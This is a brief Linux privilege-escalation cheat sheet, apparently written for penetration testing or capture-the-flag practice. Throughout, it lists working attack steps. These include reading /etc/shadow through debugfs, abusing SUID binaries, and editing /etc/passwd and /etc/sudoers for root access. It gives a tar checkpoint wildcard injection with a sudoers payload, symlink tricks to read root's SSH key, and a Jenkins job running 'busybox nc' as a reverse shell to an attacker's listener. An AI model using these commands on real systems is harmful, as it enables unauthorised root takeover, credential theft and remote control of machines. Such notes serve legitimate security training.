
#### SOP for Linux 

1. Disk group: id => `debugfs -w /dev/sdaX` then `cat /etc/shadow`, `getent group` for other groups 
2. Check `sudo -l` , su , env ~ (eg env, apt-get, if 'less' then `!sh`) 
3. SUID `find / -perm -4000 -type f 2>/dev/null` = GTFObins (eg find, strace, gcore, wget) 
4. Find writable files `find . -type f -writable` (eg /etc/passwd then update user to root group) 
5. Cron in /etc/crontab ; PATH has /dev/shm , /usr/local/bin , & so on? Job is writable? 
6. Find creds in /var/www , databases like *.db 
7. Run `pspy64` to see creds in running processes (eg mysqldump) or `ss -tulnp` 
8. Exploits, eg Polkit CVE-2021-4034 , CVE-2026-31431, Dirty Frags 


#### Unusual exploits 
- Privesc has "tar ... *" ; put `echo 'user ALL=(root) NOPASSWD: ALL' > /etc/sudoers` in payload.sh 
- - Then `echo "" > '--checkpoint=1'` and `echo "" > '--checkpoint-action=exec=sh payload.sh'` and tar. 
- User in **mlocate** group, run `strings mlocate.db` to find creds file 
- - Run `ln -sf /path/cred.txt test` then `sudo -u other_user /usr/bin/sync.sh test`. 
- Jenkins build job = `busybox nc {{LHOST}} {{LPORT}} -e /bin/sh` 
- If Docker try `ln -s /root/.ssh/id_rsa /var/log/gitlab/root_key` then `unzip /opt/backups/backup.zip` 

- If custom binary try `ls -al` and `--help` ; if * in custom path try ../../ too. 
- Create Makefile to add user to sudo group or /etc/sudoers, run make install, `exec su -l user` 
- Cron job needs some 'utils.so' (check PATH), **compile** and put in /usr/local/lib/dev 
> Just whack the user into `/etc/sudoers` when unsure. 
